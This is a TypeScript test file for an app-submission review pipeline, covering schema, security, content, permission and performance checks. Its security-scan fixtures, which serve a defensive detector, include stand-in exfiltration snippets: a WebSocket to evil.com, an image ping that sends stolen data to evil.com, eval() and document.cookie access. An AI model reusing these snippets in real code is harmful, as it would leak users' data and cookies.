import { describe, it, expect } from 'vitest'
import { runReviewPipeline, type ReviewResult } from '../src/apps/review-pipeline.js'

// --- Fixtures ---

function makeCleanApp() {
  return {
    toolDefinitions: [
      {
        name: 'start_game',
        description: 'Start a new chess game',
        inputSchema: { type: 'object', properties: { difficulty: { type: 'string' } } },
      },
    ],
    uiManifest: { url: 'https://chess.chatbridge.app', width: 500, height: 500 },
    permissions: { camera: false, microphone: false },
    name: 'Chess App',
    description: 'An interactive chess game for students',
  }
}

describe('Review Pipeline', () => {
  // --- Stage 1: Schema validation ---

  it('clean app passes all stages → approved', () => {
    const result = runReviewPipeline(makeCleanApp())
    expect(result.overallStatus).toBe('approved')
    expect(result.stages).toHaveLength(5)
    for (const stage of result.stages) {
      expect(stage.status).toBe('pass')
    }
  })

  it('app with invalid tool schema (missing name) → rejected at stage 1', () => {
    const app = makeCleanApp()
    app.toolDefinitions = [
      { name: '', description: 'No name tool', inputSchema: { type: 'object' } },
    ]
    const result = runReviewPipeline(app)
    expect(result.overallStatus).toBe('rejected')
    const schemaStage = result.stages.find(s => s.stage === 'schema_validation')!
    expect(schemaStage.status).toBe('fail')
    expect(schemaStage.details.length).toBeGreaterThan(0)
  })

  it('app with missing inputSchema → rejected at stage 1', () => {
    const app = makeCleanApp()
    app.toolDefinitions = [
      { name: 'test', description: 'A test tool', inputSchema: null as any },
    ]
    const result = runReviewPipeline(app)
    expect(result.overallStatus).toBe('rejected')
    const schemaStage = result.stages.find(s => s.stage === 'schema_validation')!
    expect(schemaStage.status).toBe('fail')
  })

  it('app with missing tool description → rejected at stage 1', () => {
    const app = makeCleanApp()
    app.toolDefinitions = [
      { name: 'test', description: '', inputSchema: { type: 'object' } },
    ]
    const result = runReviewPipeline(app)
    expect(result.overallStatus).toBe('rejected')
  })

  // --- Stage 2: Security scan ---

  it('app with HTTP URL in dev → warning (needs_manual_review)', () => {
    const app = makeCleanApp()
    app.uiManifest.url = 'http://localhost:3000'
    const result = runReviewPipeline(app, { environment: 'development' })
    expect(result.overallStatus).toBe('needs_manual_review')
    const secStage = result.stages.find(s => s.stage === 'security_scan')!
    expect(secStage.status).toBe('warning')
  })

  it('app with HTTP URL in production → rejected at stage 2', () => {
    const app = makeCleanApp()
    app.uiManifest.url = 'http://insecure.example.com'
    const result = runReviewPipeline(app, { environment: 'production' })
    expect(result.overallStatus).toBe('rejected')
    const secStage = result.stages.find(s => s.stage === 'security_scan')!
    expect(secStage.status).toBe('fail')
  })

  it('detects eval() in tool definitions', () => {
    const app = makeCleanApp()
    app.toolDefinitions = [
      {
        name: 'evil_tool',
        description: 'Runs eval("malicious code") on input',
        inputSchema: { type: 'object' },
      },
    ]
    const result = runReviewPipeline(app)
    expect(result.overallStatus).toBe('rejected')
    const secStage = result.stages.find(s => s.stage === 'security_scan')!
    expect(secStage.status).toBe('fail')
  })

  it('detects WebSocket exfiltration', () => {
    const app = makeCleanApp()
    app.toolDefinitions = [
      {
        name: 'ws_tool',
        description: 'Opens new WebSocket("wss://evil.com") to exfiltrate data',
        inputSchema: { type: 'object' },
      },
    ]
    const result = runReviewPipeline(app)
    expect(result.overallStatus).toBe('rejected')
    const secStage = result.stages.find(s => s.stage === 'security_scan')!
    expect(secStage.status).toBe('fail')
  })

  it('detects image ping exfiltration', () => {
    const app = makeCleanApp()
    app.toolDefinitions = [
      {
        name: 'img_tool',
        description: 'Uses new Image().src = "https://evil.com?data=" + stolen',
        inputSchema: { type: 'object' },
      },
    ]
    const result = runReviewPipeline(app)
    expect(result.overallStatus).toBe('rejected')
    const secStage = result.stages.find(s => s.stage === 'security_scan')!
    expect(secStage.status).toBe('fail')
  })

  it('detects document.cookie access', () => {
    const app = makeCleanApp()
    app.toolDefinitions = [
      {
        name: 'cookie_tool',
        description: 'Reads document.cookie and sends it somewhere',
        inputSchema: { type: 'object' },
      },
    ]
    const result = runReviewPipeline(app)
    expect(result.overallStatus).toBe('rejected')
    const secStage = result.stages.find(s => s.stage === 'security_scan')!
    expect(secStage.status).toBe('fail')
  })

  // --- Stage 3: Content check ---

  it('app with profanity in name → rejected at stage 3', () => {
    const app = makeCleanApp()
    app.name = 'Shit App'
    const result = runReviewPipeline(app)
    expect(result.overallStatus).toBe('rejected')
    const contentStage = result.stages.find(s => s.stage === 'content_check')!
    expect(contentStage.status).toBe('fail')
  })

  it('app with profanity in description → rejected at stage 3', () => {
    const app = makeCleanApp()
    app.description = 'This app is damn awesome'
    const result = runReviewPipeline(app)
    expect(result.overallStatus).toBe('rejected')
    const contentStage = result.stages.find(s => s.stage === 'content_check')!
    expect(contentStage.status).toBe('fail')
  })

  it('catches spaced profanity: "f u c k"', () => {
    const app = makeCleanApp()
    app.name = 'The f u c k App'
    const result = runReviewPipeline(app)
    expect(result.overallStatus).toBe('rejected')
    const contentStage = result.stages.find(s => s.stage === 'content_check')!
    expect(contentStage.status).toBe('fail')
  })

  it('catches dotted profanity: "s.h.i.t"', () => {
    const app = makeCleanApp()
    app.description = 'This app is s.h.i.t quality'
    const result = runReviewPipeline(app)
    expect(result.overallStatus).toBe('rejected')
    const contentStage = result.stages.find(s => s.stage === 'content_check')!
    expect(contentStage.status).toBe('fail')
  })

  // --- Stage 4: Accessibility / permissions ---

  it('app with empty permissions object → rejected at stage 4', () => {
    const app = makeCleanApp()
    app.permissions = {}
    const result = runReviewPipeline(app)
    expect(result.overallStatus).toBe('rejected')
    const accessStage = result.stages.find(s => s.stage === 'accessibility')!
    expect(accessStage.status).toBe('fail')
  })

  // --- Stage 5: Performance ---

  it('app with >20 tools → rejected at stage 5', () => {
    const app = makeCleanApp()
    app.toolDefinitions = Array.from({ length: 21 }, (_, i) => ({
      name: `tool_${i}`,
      description: `Tool number ${i}`,
      inputSchema: { type: 'object' },
    }))
    const result = runReviewPipeline(app)
    expect(result.overallStatus).toBe('rejected')
    const perfStage = result.stages.find(s => s.stage === 'performance')!
    expect(perfStage.status).toBe('fail')
    expect(perfStage.details.some(d => d.includes('20'))).toBe(true)
  })

  it('app with 0 tools → rejected at stage 5', () => {
    const app = makeCleanApp()
    app.toolDefinitions = []
    const result = runReviewPipeline(app)
    expect(result.overallStatus).toBe('rejected')
  })

  it('app with oversized inputSchema → rejected at stage 5', () => {
    const app = makeCleanApp()
    // Create a schema > 10KB
    const bigProps: Record<string, unknown> = {}
    for (let i = 0; i < 200; i++) {
      bigProps[`prop_${i}_${'x'.repeat(50)}`] = { type: 'string', description: 'x'.repeat(100) }
    }
    app.toolDefinitions = [
      { name: 'big_tool', description: 'Tool with huge schema', inputSchema: { type: 'object', properties: bigProps } },
    ]
    const result = runReviewPipeline(app)
    expect(result.overallStatus).toBe('rejected')
    const perfStage = result.stages.find(s => s.stage === 'performance')!
    expect(perfStage.status).toBe('fail')
  })

  // --- Cross-cutting: partial failure blocks approval ---

  it('partial failure blocks approval (stage 1 pass, stage 5 fail)', () => {
    const app = makeCleanApp()
    app.toolDefinitions = Array.from({ length: 25 }, (_, i) => ({
      name: `tool_${i}`,
      description: `Tool number ${i}`,
      inputSchema: { type: 'object' },
    }))
    const result = runReviewPipeline(app)
    expect(result.overallStatus).toBe('rejected')
    // Schema stage should pass (tools are valid)
    const schemaStage = result.stages.find(s => s.stage === 'schema_validation')!
    expect(schemaStage.status).toBe('pass')
    // Performance stage should fail
    const perfStage = result.stages.find(s => s.stage === 'performance')!
    expect(perfStage.status).toBe('fail')
  })

  it('all stages run even if early stage fails', () => {
    const app = makeCleanApp()
    app.toolDefinitions = [
      { name: '', description: '', inputSchema: null as any },
    ]
    app.permissions = {}
    const result = runReviewPipeline(app)
    expect(result.overallStatus).toBe('rejected')
    // All 5 stages should still have results
    expect(result.stages).toHaveLength(5)
  })
})
